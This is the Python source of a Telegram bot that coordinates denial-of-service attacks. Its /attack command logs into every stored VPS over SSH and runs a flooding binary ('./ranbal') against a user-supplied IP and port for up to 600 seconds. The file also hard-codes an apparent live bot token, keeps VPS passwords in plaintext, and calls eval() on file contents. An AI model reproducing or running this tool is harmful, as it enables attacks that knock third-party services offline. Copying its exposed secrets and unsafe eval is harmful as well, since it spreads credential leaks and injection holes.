import asyncio
import datetime
import paramiko
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '6834692290:AAEG9jSPAxgj9fMEUTRHHn8_-GtnLhitRLQ'
ADMIN_USER_ID = 5142603617
USERS_FILE = 'users.txt'
VPS_FILE = 'vps.txt'
LOG_FILE = 'log.txt'
attack_in_progress = False
users = set()
vps_list = []

# Load VPS list from file
def load_vps():
    try:
        with open(VPS_FILE) as f:
            return [eval(line.strip()) for line in f]
    except FileNotFoundError:
        return []

def save_vps(vps_list):
    with open(VPS_FILE, 'w') as f:
        f.writelines(f"{vps}\n" for vps in vps_list)

# Load users from file
def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

def log_command(user_id, target, port, duration):
    with open(LOG_FILE, 'a') as f:
        f.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Duration: {duration} | Timestamp: {datetime.datetime.now()}\n")

async def add_vps(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("⚠️ Unauthorized access.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /addvps <ip> <user> <password>")
        return
    
    vps = {"ip": context.args[0], "user": context.args[1], "password": context.args[2]}
    vps_list.append(vps)
    save_vps(vps_list)
    await update.message.reply_text(f"✔️ VPS {vps['ip']} added successfully.")

async def remove_vps(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("⚠️ Unauthorized access.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /removevps <ip>")
        return
    
    global vps_list
    vps_list = [vps for vps in vps_list if vps['ip'] != context.args[0]]
    save_vps(vps_list)
    await update.message.reply_text(f"✔️ VPS {context.args[0]} removed successfully.")

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    
    if user_id not in users:
        await update.message.reply_text("⚠️ Unauthorized access.")
        return
    
    if attack_in_progress:
        await update.message.reply_text("⚠️ Attack already in progress. Please wait.")
        return
    
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
        return
    
    ip, port, duration = args
    try:
        duration = int(duration)
        if duration > 600:
            await update.message.reply_text("⚠️ Max duration is 600s.")
            return
    except ValueError:
        await update.message.reply_text("⚠️ Duration must be a number.")
        return
    
    attack_in_progress = True
    command = f"./ranbal {ip} {port} {duration} 800"
    results = []
    for vps in vps_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(vps['ip'], username=vps['user'], password=vps['password'])
            stdin, stdout, stderr = client.exec_command(command)
            output = stdout.read().decode() + stderr.read().decode()
            client.close()
            results.append(f"{vps['ip']}: {output}")
        except Exception as e:
            results.append(f"{vps['ip']}: Error {str(e)}")
    
    attack_in_progress = False
    log_command(user_id, ip, port, duration)
    await update.message.reply_text("\n".join(results))

async def list_vps(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await update.message.reply_text("⚠️ Unauthorized access.")
        return
    
    if not vps_list:
        await update.message.reply_text("No VPS configured.")
    else:
        message = "Configured VPS:\n" + "\n".join([f"{vps['ip']} - {vps['user']}" for vps in vps_list])
        await update.message.reply_text(message)

def main():
    global users, vps_list
    users = load_users()
    vps_list = load_vps()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("addvps", add_vps))
    application.add_handler(CommandHandler("removevps", remove_vps))
    application.add_handler(CommandHandler("listvps", list_vps))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
